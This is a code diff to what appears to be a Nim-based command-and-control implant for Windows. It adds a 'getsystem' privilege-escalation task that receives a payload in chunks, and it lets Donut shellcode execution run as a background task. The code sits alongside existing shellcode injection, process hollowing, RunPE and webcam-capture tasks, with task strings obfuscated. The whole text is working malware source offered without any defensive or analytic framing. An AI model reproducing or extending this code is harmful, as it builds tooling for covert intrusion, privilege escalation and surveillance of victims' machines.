@@ -56,6 +56,8 @@ when defined(windows):
     import tasks/spawn
   when defined(cmd_spawnas):
     import tasks/spawnas
+  when defined(cmd_getsystem):
+    import tasks/getsystem
   when defined(cmd_register_file):
     import tasks/register_file
   when defined(cmd_webcam_snap) or defined(cmd_webcam_stream):
@@ -67,7 +69,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btRegisterFile, btSpawn, btSpawnAs
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE, btPowershellImport, btRegisterFile, btSpawn, btSpawnAs, btGetSystem
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -79,7 +81,7 @@ type
     params: JsonNode  # Store original params for execute-assembly
   
   MonitoringTaskType* = enum
-    mtClipboardMonitor, mtPortscan, mtWebcamStream
+    mtClipboardMonitor, mtPortscan, mtWebcamStream, mtDonut
   
   ProfileKind = enum
     pkHttp, pkWebSocket, pkHttpx, pkDns, pkTcp, pkSmb
@@ -692,6 +694,20 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           )
           agent.backgroundTasks[taskId] = state
       
+      of obf("getsystem"):
+        when defined(cmd_getsystem) and defined(windows):
+          if params.hasKey(obf("uuid")) and params[obf("uuid")].getStr().len > 0:
+            var state = BackgroundTaskState(
+              taskType: btGetSystem,
+              path: "",
+              fileId: params[obf("uuid")].getStr(),
+              totalChunks: 0,
+              currentChunk: 1,
+              fileData: @[],
+              params: params
+            )
+            agent.backgroundTasks[taskId] = state
+      
       of obf("screenshot"):
         when defined(cmd_screenshot) and defined(windows):
           # Screenshot uses btDownload with in-memory fileData for chunked transfer
@@ -800,6 +816,9 @@ proc checkBackgroundTasks*(agent: var Agent) =
     of mtWebcamStream:
       when defined(cmd_webcam_stream) and defined(windows):
         result = checkWebcamStream(taskId)
+    of mtDonut:
+      when defined(cmd_donut) and defined(windows):
+        result = checkDonutExecution(taskId)
     
     if result != nil:
       agent.taskResponses.add(result)
@@ -1114,6 +1133,11 @@ proc postResponses*(agent: var Agent) =
                   if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] Donut complete"
+                  elif donutResp.hasKey(obf("status")) and donutResp[obf("status")].getStr() == obf("processing"):
+                    # Execution started in background thread - register as monitoring task
+                    agent.backgroundTasks.del(taskId)
+                    agent.activeMonitoringTasks[taskId] = mtDonut
+                    debug "[DEBUG] Donut execution started as background task"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
@@ -1200,6 +1224,27 @@ proc postResponses*(agent: var Agent) =
                   if spawnasResp.hasKey(obf("completed")) and spawnasResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] SpawnAs complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btGetSystem:
+              when defined(cmd_getsystem) and defined(windows):
+                # Process incoming file chunks for getsystem spawn payload
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  let getsysResp = processGetSystemChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(getsysResp)
+                  
+                  if getsysResp.hasKey(obf("completed")) and getsysResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] GetSystem spawn complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
